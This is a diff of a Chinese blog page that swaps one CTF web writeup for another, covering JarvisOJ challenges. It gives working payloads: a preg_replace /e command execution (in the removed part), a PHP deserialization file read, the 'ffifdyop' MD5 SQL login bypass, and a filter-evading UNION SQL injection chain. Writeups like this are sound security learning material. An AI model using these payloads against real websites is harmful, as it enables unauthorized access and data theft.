@@ -3,31 +3,31 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>攻防世界Web - MINX&#39;s Blog</title>
+  <title>JarvisOj - MINX&#39;s Blog</title>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
   
 
   <link rel="shortcut icon" href="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/head.png" type="image/png">
-  <meta name="description" content="攻防世界Web进阶部分Writeup">
+  <meta name="description" content="https://www.jarvisoj.com/">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界Web">
-<meta property="og:url" content="http://iminx.cn/2019/10/30/攻防世界WP/index.html">
+<meta property="og:title" content="JarvisOj">
+<meta property="og:url" content="http://iminx.cn/2019/11/27/JarvisOj/index.html">
 <meta property="og:site_name" content="MINX&#39;s Blog">
-<meta property="og:description" content="攻防世界Web进阶部分Writeup">
+<meta property="og:description" content="https://www.jarvisoj.com/">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-30T16:11:23.021Z">
+<meta property="og:updated_time" content="2019-12-02T17:05:18.341Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="攻防世界Web">
-<meta name="twitter:description" content="攻防世界Web进阶部分Writeup">
+<meta name="twitter:title" content="JarvisOj">
+<meta name="twitter:description" content="https://www.jarvisoj.com/">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1580272697227">
+  <link rel="stylesheet" href="/css/style.css?v=1580272697219">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -141,34 +141,103 @@
         
         <img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/2.jpg">
         
-        <h1>攻防世界Web</h1>
+        <h1>JarvisOj</h1>
     </div>
   <div class="nexmoe-post-meta">
-    <a><i class="nexmoefont icon-calendar-fill"></i>2019年10月30日</a>
-    <a><i class="nexmoefont icon-areachart"></i>258 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年11月27日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1,015 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 5 分钟</a>
     
       <a class="nexmoefont icon-appstore-fill -link" href="/categories/Writeup/">Writeup</a>
     
     
   </div>
   <article>
-    <p>攻防世界Web进阶部分Writeup</p>
+    <p><a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">https://www.jarvisoj.com/</a></p>
 <a id="more"></a>
-<h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><p>hint：其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统<br>所以直接进入设备维护中心，然后再点一下“云平台设备维护中心”，就可以发现有一个page参数，直接php伪协议读index.php，可以读到源码,其中关键部分：</p>
-<pre><code>//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试
-if($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] === &#39;127.0.0.1&#39;){
-    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;
-    $pattern = $_GET[pat];
-    $replacement = $_GET[rep];
-    $subject = $_GET[sub];
-    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) {
-        preg_replace($pattern, $replacement, $subject);
-    }else{
-        die();
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="LocalHost"><a href="#LocalHost" class="headerlink" title="LocalHost"></a>LocalHost</h2><p>抓包加一个“X-Forwarded-For: 127.0.0.1”完事</p>
+<h2 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h2><p>刚开始以为改端口就完了，，后来发现是我太菜了，要改我们的访问端口<br><code>curl --loacl-port 51 http://web.jarvisoj.com:32770/</code>就拿到了flag，，学到了</p>
+<h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>进去以后就是一张图片<br>先view-source一下看到了：<br><code>&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;</code><br>看到了一个showimg.php，看样子应该可以用img这个参数来读文件，先读一下showimg.php这个文件，没看到啥有用的东西，再看一下index.php看到了有一个反序列化的点，看样子是反序列化的题目，源码：</p>
+<pre><code>&lt;?php 
+    require_once(&#39;shield.php&#39;);
+    $x = new Shield();
+    isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
+    if (!empty($g)) {
+        $x = unserialize($g);
     }
-}</code></pre><p>这里就比较明显了，就是用三个参数构造后门，这里考的是preg_replace的命令执行漏洞，payload<code>?pat=/test/e&amp;rep=system(&quot;ls&quot;)&amp;sub=jutst%20test</code><br>然后可以构造<code>?pat=/test/e&amp;rep=system(&quot;cd%20s3chahahaDir%26%26cd%20flag%26%26cat%20flag.php&quot;)&amp;sub=jutst%20test</code>读到flag</p>
-<h1 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h1><p>一开始以为是sql注入，试了半天不行，看了WP才知道是爆破id，到2333时出flag？？？？</p>
+    echo $x-&gt;readfile();
+?&gt;</code></pre><p>看到了shield.php，读一下看看：</p>
+<pre><code>&lt;?php
+    //flag is in pctf.php
+    class Shield {
+        public $file;
+        function __construct($filename = &#39;&#39;) {
+            $this -&gt; file = $filename;
+        }
+
+        function readfile() {
+            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE  
+            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) {
+                return @file_get_contents($this-&gt;file);
+            }
+        }
+    }
+?&gt;</code></pre><p>payload:</p>
+<pre><code>&lt;?php
+
+class Shield{
+    public $file=&#39;pctf.php&#39;;
+}
+$c = new Shield();
+echo serialize($c);
+?&gt;</code></pre><p>“view-source:<a href="http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}&quot;" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}&quot;</a><br>就拿到了flag</p>
+<h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>提示说需要密码才能拿到flag，，但是测试了一下发现当输入双引号的时候会报sql错误，应该是存在sql注入，但是测试了好久没发现有什么用，，看了一眼wp要先抓包，，在head里面有hint。。。<br>‘Hint: “select * from <code>admin</code> where password=’”.md5($pass,true).”‘“‘<br>然后想到应该是md5的安全问题，0e开头的问题应该是不存在，参考了一下<a href="https://www.cnblogs.com/piaomiaohongchen/p/10659359.html" target="_blank" rel="noopener">https://www.cnblogs.com/piaomiaohongchen/p/10659359.html</a><br>试了一下文中给出的密码ffifdyop就拿到了flag</p>
+<h2 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h2><p>打开网页只有一个hello world，查看网页源代码没看到啥有用的东西，于是就看看有没有robots.txt，看到了admin_s3cr3t.php，访问拿到假的flag，想了想应该是跟cookie有关，于是就抓包看看，应该是在cookie有判断是不是admin，但是我抓到的包没有cookie，反而是看到一个类似于base64的一串编码，就一直在搞这个也没搞出个啥，后来看了一下wp别人就有抓到admin=0.。。。我就重新刷新重新抓了一下包才看到了这玩意，，改成1就拿到了flag，看来应该是还没有设置cookie就被我抓包了，，，害，下次注意</p>
+<h2 id="IN-A-mess"><a href="#IN-A-mess" class="headerlink" title="IN A mess"></a>IN A mess</h2><p>1.查看网页源代码让我访问index.phps，看到源码</p>
+<pre><code>&lt;?php
+
+error_reporting(0);
+echo &quot;&lt;!--index.phps--&gt;&quot;;
+
+if(!$_GET[&#39;id&#39;])
+{
+    header(&#39;Location: index.php?id=1&#39;);
+    exit();
+}
+$id=$_GET[&#39;id&#39;];
+$a=$_GET[&#39;a&#39;];
+$b=$_GET[&#39;b&#39;];
+if(stripos($a,&#39;.&#39;))
+{
+    echo &#39;Hahahahahaha&#39;;
+    return ;
+}
+$data = @file_get_contents($a,&#39;r&#39;);
+if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)
+{
+    require(&quot;flag.txt&quot;);
+}
+else
+{
+    print &quot;work harder!harder!harder!&quot;;
+}
+
+
+?&gt;</code></pre><p>可以看到主要就是那一层if</p>
+<ol>
+<li>$data用php://input传进去</li>
+<li>id=0</li>
+<li>b长度要大于5但是要满足第二、三层要长度为0，这时候就要让b=%0011111，strlen不会被截断，substr会被截断</li>
+<li>然后让我们访问<a href="http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1，又看到了id=1，有可能是注入" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1，又看到了id=1，有可能是注入</a></li>
+<li>用单引号测试发现直接返回了sql语句，那看来应该就是sql注入了</li>
+<li>测试发现过滤了空格这个可以用注释符/**/绕过，但是发现直接用会被过滤，试着往里面加点东西就好了</li>
+<li>用<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3#</code>测试得到字段数为3</li>
+<li>用<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,database()/*1*/#</code>拿到数据库名是test</li>
+<li>用<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,table_name/*1*/frofromm/*1*/information_schema.tables/*1*/where/*1*/table_schema=0x74657374#</code>拿到表名content</li>
+<li>用<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74#</code>得到字段名是id,context,title</li>
+<li>用<code>http://web.jarvisoj.com:32780/%5eHT2mCpcvOLf/index.php?id=0/*1*/ununionion/*1*/selselectect/*1*/1,2,group_concat(context)/*1*/frofromm/*1*/content#</code>拿到flag</li>
+</ol>
 
   </article>
   
@@ -176,7 +245,7 @@ if($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;] === &#39;127.0.0.1&#39;){
 <div class="nexmoe-post-copyright">
 <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
 <strong>本文作者：</strong>MINX<br>
-<strong>本文链接：</strong><a href="http://iminx.cn/2019/10/30/攻防世界WP/" title="http://iminx.cn/2019/10/30/攻防世界WP/" target="_blank" rel="noopener">http://iminx.cn/2019/10/30/攻防世界WP/</a><br>
+<strong>本文链接：</strong><a href="http://iminx.cn/2019/11/27/JarvisOj/" title="http://iminx.cn/2019/11/27/JarvisOj/" target="_blank" rel="noopener">http://iminx.cn/2019/11/27/JarvisOj/</a><br>
 
   <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可 <br> <a href="http://www.miitbeian.gov.cn/">闽ICP备19007766号</a>
 
